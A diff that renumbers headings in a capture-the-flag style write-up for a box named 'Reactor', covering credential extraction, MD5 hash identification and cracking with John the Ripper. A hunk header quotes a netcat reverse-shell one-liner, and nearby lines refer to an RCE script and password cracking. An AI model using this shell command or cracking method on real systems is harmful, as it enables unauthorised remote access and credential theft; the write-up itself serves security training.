@@ -1127,7 +1127,7 @@ busybox nc <YOUR_IP> 4444 -e /bin/sh
 
 ## 4. Lateral Movement — SSH as engineer
 
-##### 3.2.2 Database Credential Extraction
+### 4.1 Database Credential Extraction
 
 The database was queried directly via `rce.py`.
 
@@ -1180,7 +1180,7 @@ However, you can look for the highly specific **"fingerprint"** of an MD5 hash. 
 
 Here is how you can identify them, along with the tools to do it automatically.
 
-###### 1. The Visual Checklist (The Fingerprint)
+#### 1. The Visual Checklist (The Fingerprint)
 
 An MD5 hash always follows these exact rules:
 
@@ -1192,7 +1192,7 @@ An MD5 hash always follows these exact rules:
 
 If a string is 32 characters long and only contains `0-9` and `a-f`, there is a 99% chance it is an MD5 hash.
 
-###### 2. How it compares to other common hashes
+#### 2. How it compares to other common hashes
 
 To help you tell them apart, look at how MD5 compares to other common hashes used for passwords and files:
 
@@ -1203,7 +1203,7 @@ To help you tell them apart, look at how MD5 compares to other common hashes use
 |**SHA-256**|**64**|`6d67... (much longer) ...8a41`|
 |**Bcrypt**|**60**|Starts with `$2a$`, `$2b$`, or `$2y$`|
 
-###### 3. Automated Tools to Identify Hashes
+#### 3. Automated Tools to Identify Hashes
 
 Instead of counting characters manually, you can use tools that analyze the string and tell you exactly what it is.
 
@@ -1247,7 +1247,7 @@ Look at where you found this hash in the "Reactor" machine. The source tells you
 <br>
 </div>
 
-### 4.1 Hash Cracking
+### 4.2 Hash Cracking
 
 The hashes are MD5 format. Using John the Ripper with the rockyou wordlist:
 
